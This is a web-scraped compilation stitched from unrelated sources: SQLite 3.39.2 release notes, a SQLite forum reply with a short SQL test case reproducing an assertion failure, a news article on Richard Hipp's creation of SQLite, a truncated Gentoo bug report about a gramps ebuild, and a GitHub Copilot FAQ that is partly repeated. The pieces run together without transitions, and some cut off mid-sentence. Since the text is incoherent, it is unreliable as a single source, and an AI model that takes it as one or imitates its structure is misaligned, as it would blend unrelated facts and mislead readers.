## SQLite Release 3.39.2 On 2022-07-21

**Prior changes from version 3.39.0 (2022-06-25):**

1. Add (long overdue) support for [RIGHT and FULL OUTER JOIN](../lang_select.html#rjoin).- Add new binary comparison operators [IS NOT DISTINCT FROM](../lang_expr.html#isdf) and [IS DISTINCT FROM](../lang_expr.html#isdf)
     that are equivalent to IS and IS NOT, respective, for compatibility with
     PostgreSQL and SQL standards.- Add a new return code (value "3") from the [sqlite3\_vtab\_distinct()](../c3ref/vtab_distinct.html)
       interface that indicates a query that has both DISTINCT and ORDER BY
       clauses.- Added the [sqlite3\_db\_name()](../c3ref/db_name.html) interface.- The unix os interface resolves all symbolic links in database
           filenames to create a canonical name for the database before the
           file is opened.
           If the [SQLITE\_OPEN\_NOFOLLOW](../c3ref/c_open_autoproxy.html) flag is used with [sqlite3\_open\_v2()](../c3ref/open.html)
           or similar, the open will fail if any element of the path is a
           symbolic link.- Defer materializing views until the materialization
             is actually needed, thus avoiding unnecessary work if the materialization turns
             out to never be used.- The [HAVING clause](../lang_select.html#resultset) of a [SELECT statement](../lang_select.html) is now allowed on any aggregate query,
               even queries that do not have a [GROUP BY clause](../lang_select.html#resultset).- Many [microoptimizations](../cpu.html#microopt) collectively reduce CPU cycles by about 2.3%.

**Prior changes from version 3.39.1 (2022-07-13):**

1. Fix an incorrect result from a query that uses a view that contains a compound
   SELECT in which only one arm contains a RIGHT JOIN and where the view is not
   the first FROM clause term of the query that contains the view.
   [forum post 174afeae5734d42d](https://sqlite.org/forum/forumpost/174afeae5734d42d).- Fix some harmless compiler warnings.- Fix a long-standing problem with [ALTER TABLE RENAME](../lang_altertable.html#altertabrename) that can only arise
       if the [sqlite3\_limit](../c3ref/limit.html)([SQLITE\_LIMIT\_SQL\_LENGTH](../c3ref/c_limit_attached.html#sqlitelimitsqllength)) is set to a very small value.- Fix a long-standing problem in [FTS3](../fts3.html) that can only arise when compiled with
         the [SQLITE\_ENABLE\_FTS3\_PARENTHESIS](../compile.html#enable_fts3_parenthesis) compile-time option.- Fix the build so that is works when the [SQLITE\_DEBUG](../compile.html#debug) and
           [SQLITE\_OMIT\_WINDOWFUNC](../compile.html#omit_windowfunc) compile-time options are both provided at the
           same time.- Fix the initial-prefix optimization for the [REGEXP](../lang_expr.html#regexp) extension so that it works
             correctly even if the prefix contains characters that require a 3-byte UTF8
             encoding.- Enhance the [sqlite\_stmt](../stmt.html) virtual table so that it buffers all of its output.

**Changes in this specific patch release, version 3.39.2 (2022-07-21):**

1. Fix a performance regression in the query planner associated with rearranging
   the order of FROM clause terms in the presences of a LEFT JOIN.- Apply fixes for CVE-2022-35737, Chromium bugs 1343348 and 1345947,
     [forum post 3607259d3c](https://sqlite.org/forum/forumpost/3607259d3c), and
     other minor problems discovered by internal testing.

     **Hashes:**- SQLITE\_SOURCE\_ID: 2022-07-21 15:24:47 698edb77537b67c41adc68f9b892db56bcf9a55e00371a61420f3ddd668e6603- SHA3-256 for sqlite3.c: bffbaafa94706f0ed234f183af3eb46e6485e7e2c75983173ded76e0da805f11

A [complete list of SQLite releases](../changes.html)
in a single page and a [chronology](../chronology.html) are both also available.

check-in is available at
[SQLite version control site](https://www.sqlite.org/src/timeline).

## Application Security

![Screenshot illustrating GitHub Advanced Security (GHAS) in action. The left side shows a line graph tracking the number of vulnerabilities by severity (Critical, High, Moderate, Low) over time, with data points from January 1 to February 15, 2024. The right side displays a security bot's recommendation to fix a vulnerability in the code. The bot explains that user-provided input is being used in an HTTP response without sanitization, potentially leading to a cross-site scripting (XSS) attack. The AI-suggested fix involves using the escape-html library to sanitize the input, with the old code in red and the new, corrected code in green. The background features a smooth blue gradient.](/images/modules/site/features/fp24/section-security-illo.webp)

# Assertion `pRec->nField>0 && pRec->nField<=pIdx->nSampleCol' failed.

### (2) By Richard Hipp ([drh](/forum/timeline?ss=v&y=f&vfx&u=drh)) on 2022-07-15 12:59:59 in reply to [1](/forum/forumpost/3607259d3c) [[link]](/forum/forumpost/f18482533176f971) [[source]](/forum/forumpost/f18482533176f971?raw)

This bug goes back almost 8 years to
[check-in ddb5f0558c445699](https://sqlite.org/src/info/ddb5f0558c445699) on
[2016-09-07](https://sqlite.org/src/timeline?c=ddb5f0558c445699), version 3.15.0.
On the other hand, the problem only comes up if you cmpile
with -DSQLITE\_ENABLE\_STAT4. The STAT4 requirement means
that most applications are unaffected by this problem.

The bug is now fixed on trunk and on branch-3.39.

Here is a slightly simplified alternative test case:

> ```
> CREATE TABLE t1(a INT, b INT PRIMARY KEY) WITHOUT ROWID;
> INSERT INTO t1(a, b) VALUES (0, 1),(15,-7),(3,100);
> ANALYZE;
> SELECT * FROM t1 WHERE (b,a) BETWEEN (0,5) AND (99,-2);
>
> ```

Last week [Adam Gordon Bell](https://www.linkedin.com/in/adamgordonbell/?originalSubdomain=ca) [brought a special guest onto his podcast Corecursive](https://corecursive.com/066-sqlite-with-richard-hipp/): [Richard Hipp](https://twitter.com/drichardhipp?lang=en), the main author of SQLite.

> Dev invented the most popular database, SQLite, to eliminate server risk on a US battleship. Motorola wanted to license it for phones, so he gave them the biggest $ figure he could think of: $80K 😂 <https://t.co/9B7qpGDGSx>

In a little more than two decades, it’s become the most widely deployed database in the world, according to the [official webpage at SQLite.org](https://sqlite.org/about.html) — partly due to its simplicity. Because it’s contained in a library of C code, SQLite can be easily embedded into other software, and it’s fully self-contained. “Unlike most other SQL databases, SQLite does not have a separate server process,” its official page explains. “SQLite reads and writes directly to ordinary disk files.”

![SQLite logo](https://cdn.thenewstack.io/media/2021/07/8077b2b5-sqlite-logo-764px-sqlite370-via-wikipedia-part-of-the-public-domain-documentation.svg-300x142.png)

But crucially, it’s also open source, which leads Bell’s podcast to an intriguing question: What happens if your fun side project ends up powering the world? And the host promises that, along the way, the interview will explore the dilemma which still haunts the [open source movement](https://thenewstack.io/open-source/ "open source movement") today: How to survive becoming core infrastructure for the world.

Bell points out that SQLite is now installed in everything from web browsers to commercial airplanes, as well as popular software like iMessage and WhatsApp.

But the software was born out of Hipp’s frustration with a database that was installed on a battleship.

## ‘Can’t Connect to Server’

The story begins in a shipyard in Bath, Maine (population: 8,329). Back in the year 2000, Hipp was working for [Bath Iron Works](https://www.gd.com/our-businesses/marine-systems/bath-iron-works), a shipbuilding subsidiary of defense contractor [General Dynamics](https://www.gd.com/), and was building software for a Navy destroyer (the USS Oscar Austin). The software would operate on crucial data about the ship’s valves (for routing around pipe ruptures), and their stack had included [Informix](https://www.ibm.com/products/informix), which unfortunately stopped working whenever the server went down.

“That was embarrassing,” Hipp recalled to Bell. “A dialog box would pop up, they’d double click on the thing, and a dialog box would pop up that says, ‘Can’t connect to database server.’ It wasn’t our fault — we didn’t have any control over the database server. But what do you do if you can’t connect to the server? So we got the blame all the same, because we were painting the dialog box.”

And, as Hipp noted, “it’s a warship.” So besides the ship being continually in use, “the idea is it’s supposed to be able to work if you take battle damage! So it’s more than one pipe breaking. There’s going to be a lot of stuff broken, and people are going to be crazy, and there’s going to be smoke and blood and chaos — and in a situation like that they don’t want a dialog box that says, ‘Cannot connect to database server.'”

![](https://cdn.thenewstack.io/media/2021/07/bf608a9d-ussoscaraustin2-1024x576.jpg)

Hipp wondered if there was a way his team could pull its data straight from the database without an external dependency. “I looked around and there were no SQL database engines that would do that, and one of the guys I was working with says, ‘Richard, why don’t you just write one?'” During a temporary shutdown of government contracts (which had lasted a few months), “I was out of work for a few months, and I thought, ‘Well, I’ll just write that database engine now.'”

Back in 2006, Hipp tried to explain SQLite’s appeal [to an audience at Google](https://youtu.be/giAMt8Tj-84). “Most people hear SQL database engine, and they’re thinking [Oracle](https://www.oracle.com/index.html) — something big that you run your whole enterprise on. SQLite is sort of the opposite of that — it tries to be very small, so it’s very compact.” In fact, fully configured, at the time it was less than 250 kilobytes. And it was also serverless — and designed to be embedded within larger applications.

But the story of SQLite also shows how initiative and dedication can pay off — and how nothing can stop a determined developer. Later in his interview at Corecursive.com, Hipp recalled looking for a reference on how to write an SQL database engine — and not finding one.

“So I just had to kind of invent it myself,” he said. “It was a completely independent invention.”

For instance, Hipp remembers referring to [Donald Knuth](https://www-cs-faculty.stanford.edu/~knuth/)’s [The Art of Computer Programming](https://www-cs-faculty.stanford.edu/~knuth/taocp.html) for an implementation of a search algorithm. While theoretical underpinnings might’ve been taught at [MIT](https://web.mit.edu/), [Harvard](https://www.harvard.edu/), or the [University of California-Berkeley](https://www.berkeley.edu/), “if you didn’t go to one of those three schools, you didn’t even know this body of theory existed, and there wasn’t a real good way to find it.”

Years later he learned that nonetheless, both SQLite and Postgres had converged on the same ideas.

Ironically, back at the shipyard, Hipp’s higher-ups still insisted on using  Informix, Hipp tells Bell (although his team did use SQLite for their testing). But in addition, “I put it out there on the internet and other people started picking it up.” Soon Hipp was surprised by the uptake — including one user who’d bragged they now had an SQL database engine running on their Palm Pilot. “It really attracted a lot of attention, and that encouraged me to work on it.”

## Ringing Phones

Hipp’s [website](http://www.hwaci.com/drh/) still proudly points out that SQLite won a 2005 Google O’Reilly Open Source Award. But that was the only acclaim that SQLite received. Back in 2006, Hipp told his audience at Google that “it’s public domain, so lots of people are using it that I don’t know about” — but confirmed users included [Apple](https://www.apple.com/) and [PHP](https://www.php.net/). (At one point both [General Electric](https://www.ge.com/) and [Toshiba](https://www.toshiba.com/tai/) had contacted him requesting the U.S. export control number for SQLite — though he never found out why.)

But soon Hipp confronted another theme that haunts most open source developers: monetization. Hipp told the Corecurisve podcast that very early on, he’d received a phone call from [Motorola](https://www.motorola.com/us/), who’d wanted to include SQLite in its operating system for cellphones. “Of course, inside, I was like, ‘What? You can make money with open source software? How does this work? How do I price this?” Hipp said. “I have no idea how to do this.'”

But fortuitously, he’d brought in three people who’d worked on the original SQLite, “and that was sort of the beginning.”

The next call he fielded was from [America Online](https://www.aol.com/), which wanted to use an SQLite database on the free-trial CDs it was sending in the mail to prospective users. And soon there was a call from Symbian (which made the operating system on [Nokia](https://www.nokia.com/) phones). The company had tested 10 different database systems — two open source, and seven more proprietary. But even after giving the other vendors a chance to fine-tune their systems, SQLite still won the competition. Hipp recalled, “We cut a contract to do some development work for them.”

This led to an important development, when Symbian asked them to increase their “[bus factor](https://en.wikipedia.org/wiki/Bus_factor),” which Hipp describes as “the number of people who have to be hit by a bus in order to stop all development work… They felt like the bus factor at SQLite was too low.” Symbian’s solution? It helped fund the [SQLite Consortium](https://www.sqlite.org/consortium.html), which Hipp said is “a way of funding the project and getting more people involved to guarantee that it was going to be available long term.”

![](https://cdn.thenewstack.io/media/2021/07/f3d847e8-mitchellbaker-300x300.jpg)But he also gives a lot of credit to [Mitchell Baker](https://twitter.com/mitchellbaker?lang=en) (pictured), who was then the CEO of the Mozilla Foundation (and a lawyer by training). She’d reached out, and as he remembers it, insisted that “the developers have to be in control. Their decision is final… The companies that are using, they get the honor of contributing money, but you make all the decisions. She was very adamant about this and she laid out everything.”

In the end, Mozilla and [Adobe](https://www.adobe.com/) joined Symbian in funding the group, and to this day Hipp expresses gratitude for all the early support. “it’s been such an amazing journey… we would not be in this situation were it not for these circumstances.

## When Google Calls

Soon all major smartphones were using SQLite, Adam explains — and soon Richard fielded a phone call from [Google](https://about.google/), “before Android was a thing. This was before iPhone.”

This led the project to another key open source lesson about the value of testing. “It’s amazing how many bugs will crop up when your software suddenly gets shipped on millions of devices,” Hipp told Bell.

He spent a whole year generating tests to cover every single branch operation in the resulting binary code, he said. He’d had hopes of selling the test suite to avionics manufacturers — but while they never landed any customers, when it came to reports of bugs in Android, “it made a huge, huge difference. We just didn’t really have any bugs for the next eight or nine years.”

As a result, he said, “It did work out really well for us in that it keeps our product really solid and it enables us to turn around new features and new bug fixes very fast.”

The details are pretty impressive. “We’ll have a test case but it’ll be parameterized, so that one test case might run 100, 1,000, 100,000 tests, just by looping, by changing one of the parameters.” For a typical release, Hipp estimated that there’s on the order of 100,000 distinct test cases — and billions of tests. “We have a checklist and we will run tests for at least three days prior to a release.”

Corecursive’s interview closed with Hipp’s own inspiring advice to others who want to create impactful open source software. “I had this crazy idea that I’m going to build a database engine that does not have a server, that talks directly to disk, and ignores the data types,” he said. “And if you asked any of the experts of the day, they would’ve said, ‘That’s impossible. That will never work. That’s a stupid idea.’

Fortunately, I didn’t know any experts — and so I did it anyway.”

Please find attached gramps.tar.gz containing gramps-0.7.0.ebuild and a patch so that it will compile against python-2.2  gramps is the Genealogical Research and Analysis Management Programming System.  It is a very cool gnome/python app.  If you are in the US, you can head over to  <http://www.familysearch.com/> and you can probably find a GEDCOM file for your family tree to import into gramps. (Mormons sure do like geneaology)  I suggest app-misc/gramps Also, this ebuild depend on Imaging and ReportLab previously submitted  tod ```  [Comment 1](#c1)  Tod M.

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

